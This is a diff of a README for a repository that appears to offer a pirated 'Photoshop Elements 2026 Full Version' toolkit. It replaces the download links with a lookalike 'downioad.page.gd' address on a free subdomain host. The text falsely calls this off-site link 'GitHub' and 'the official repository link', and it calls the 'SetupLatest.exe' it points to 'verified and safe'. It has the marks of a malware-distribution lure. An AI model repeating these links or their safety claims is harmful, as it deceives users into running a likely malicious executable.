@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive toolkit for Adobe Photoshop Elements 2026, designed to enhance your photo editing experience on Windows 10 and 11. The Photoshop Elements 2026 Full Version includes advanced presets, organizer tools, and performance tweaks to maximize your creative workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ These questions cover the most frequent concerns users have when setting up or u
 
 To get started with the Photoshop Elements 2026 Enhanced Toolkit, download the installer from the official repository link. This ensures you receive the latest version with all features and security updates.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides direct access to "SetupLatest.exe", which is verified and safe for Windows systems. Always download from trusted sources to avoid any issues.
 
